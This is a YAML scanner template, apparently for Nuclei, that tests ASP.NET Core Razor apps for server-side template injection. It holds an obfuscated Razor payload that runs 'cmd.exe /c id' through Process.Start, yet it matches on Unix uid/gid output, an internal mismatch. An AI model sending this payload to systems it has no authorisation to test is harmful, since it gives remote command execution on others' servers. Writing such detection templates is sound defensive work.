id: razor-ssti

info:
  name: Razor 服务端模板注入（DAST）
  author: ritikchaddha
  severity: high
  description: |
    该模板检测 ASP.NET Core Razor 服务端模板注入。Razor 可在模板中运行 C# 代码，若不可信输入进入模板执行上下文，可能被利用执行服务端逻辑。
  reference:
    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  metadata:
    max-request: 1
  tags: razor,ssti,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "@{string+x%3Dnull%3Bint[]l%3D{105%2C100}%3Bforeach(int+c+in+l){x%2B%3D((char)c).ToString()%3B}%3B}@System.Diagnostics.Process.Start(%22cmd.exe%22%2C+%22/c+%22+x)"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
# digest: 4a0a004730450220037a9ca2b2ac11f0fa5e8fe133c5683b101b009a744a6f1958dda56852c33a8c022100de0c3346eaf86e8166ac32a43d98e9dceacece418839955ccee67a9a2b8eb174:922c64590222798bb761d5b6d8e72950